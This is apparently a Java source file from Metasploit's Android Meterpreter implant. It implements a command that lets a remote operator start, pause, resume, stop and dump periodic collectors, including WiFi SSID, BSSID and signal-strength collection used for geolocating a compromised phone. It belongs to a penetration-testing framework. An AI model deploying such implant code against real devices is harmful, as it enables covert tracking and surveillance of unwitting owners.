package com.metasploit.meterpreter.android;

import android.content.Context;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.IntervalCollectionManager;
import com.metasploit.meterpreter.IntervalCollector;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.WifiCollector;

import com.metasploit.meterpreter.command.Command;

public class interval_collect implements Command {
    private static final int TLV_EXTENSIONS = 20000;

    private static final int COLLECT_ACTION_START = 1;
    private static final int COLLECT_ACTION_PAUSE = 2;
    private static final int COLLECT_ACTION_RESUME = 3;
    private static final int COLLECT_ACTION_STOP = 4;
    private static final int COLLECT_ACTION_DUMP = 5;

    public static final int TLV_TYPE_COLLECT_TYPE = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9050);
    public static final int TLV_TYPE_COLLECT_ACTION = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9051);
    public static final int TLV_TYPE_COLLECT_TIMEOUT = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9052);

    // TLVs for all results
    public static final int TLV_TYPE_COLLECT_RESULT_GROUP = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9053);
    public static final int TLV_TYPE_COLLECT_RESULT_TIMESTAMP = TLVPacket.TLV_META_TYPE_QWORD
            | (TLV_EXTENSIONS + 9054);

    // TLVs for wifi (reusing the ones for wlan geolocate)
    public static final int TLV_TYPE_COLLECT_RESULT_WIFI = wlan_geolocate.TLV_TYPE_WLAN_GROUP;
    public static final int TLV_TYPE_COLLECT_RESULT_WIFI_SSID = wlan_geolocate.TLV_TYPE_WLAN_SSID;
    public static final int TLV_TYPE_COLLECT_RESULT_WIFI_BSSID = wlan_geolocate.TLV_TYPE_WLAN_BSSID;
    public static final int TLV_TYPE_COLLECT_RESULT_WIFI_LEVEL = wlan_geolocate.TLV_TYPE_WLAN_LEVEL;

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        boolean result = true;
        AndroidMeterpreter met = (AndroidMeterpreter) meterpreter;

        int action = request.getIntValue(TLV_TYPE_COLLECT_ACTION);

        IntervalCollectionManager manager = met.getIntervalCollectionManager();

        switch (action) {
            case COLLECT_ACTION_START: {
                result = this.startNew(manager, request);
                break;
            }
            case COLLECT_ACTION_PAUSE: {
                result = manager.pauseCollector(request.getIntValue(TLV_TYPE_COLLECT_TYPE));
                break;
            }
            case COLLECT_ACTION_RESUME: {
                result = manager.resumeCollector(request.getIntValue(TLV_TYPE_COLLECT_TYPE));
                break;
            }
            case COLLECT_ACTION_STOP: {
                IntervalCollector collector = manager.stopCollector(request.getIntValue(TLV_TYPE_COLLECT_TYPE));
                if (collector != null) {
                    result = collector.dump(response);
                }
                else {
                    result = true;
                }
                break;
            }
            case COLLECT_ACTION_DUMP: {
                IntervalCollector collector = manager.getCollector(request.getIntValue(TLV_TYPE_COLLECT_TYPE));
                if (collector != null) {
                    result = collector.dump(response);
                }
                else {
                    result = true;
                }
                break;
            }
        }

        return result ? ERROR_SUCCESS: ERROR_FAILURE;
    }

    private boolean startNew(IntervalCollectionManager manager, TLVPacket request) {
        int type = request.getIntValue(TLV_TYPE_COLLECT_TYPE);
        long timeout = (long)request.getIntValue(TLV_TYPE_COLLECT_TIMEOUT);

        return manager.createCollector(type, timeout);
    }
}


